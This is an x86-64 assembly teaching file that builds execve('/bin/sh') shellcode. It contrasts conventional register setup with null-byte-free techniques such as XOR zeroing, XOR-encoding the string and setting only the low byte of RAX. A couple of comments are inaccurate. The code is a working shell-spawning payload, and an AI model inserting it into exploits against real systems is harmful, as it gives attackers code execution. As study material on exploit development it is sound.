; Kudos to https://masterccc.github.io/memo/shellcode/ 

global _start

SECTION .text

_start:



  ; set register RDX to Zero - Conventional method
  mov rdx, 0xdeadbeef
  mov rdx, 0
	   
  ; set DX to Zero - avoid 0x0
  mov rdx, 0xdeadbeef
  xor rdx,rdx ; env


  xor rsi,rsi ; args
  
  ; Push string /bin/sh via register to stack - Conventional method
  mov rax, 0x68732f6e69622f ; "/bin/sh"
  push rax
  mov rdi,rsp
  
  pop rax ; Clean Up for demo
  
  
  ; Push string /bin/sh via register to stack - Hide 00 with XOR, than invert Register
  mov rax, 0xff978cd091969dd0 ; "/bin/sh XOR 0xffffffffffffffff"
  xor rax, 0xffffffffffffffff
  push rax
  mov rdi,rsp
  
  ; set register RAX to 0x3b sys_execve (59) - Conventional method
  mov rax, 0x3b ; sys_execve (59)  
  
  ; set register RAX to 0x3b sys_execve (59) - avoid 0x0
  ; Basic idea Set RAX to 0x0 with XOR-trick
  ; Set lowest 8 Bit (= AL) to 0x3b
  ; 0x1122334455667788
  ;================ rax (64 bits)
  ;        ======== eax (32 bits)
  ;            ====  ax (16 bits)
  ;            ==    ah (8 bits)
  ;              ==  al (8 bits)
                 
  xor eax,eax  ; Set EAX to 0x0
  mov al, 0x3b ; Set AL to 0x0
  
  syscall

; Quit
  mov  rbx,0       ; return code
  mov  rax,1       ; exit syscall number
  int  0x80        ; syscall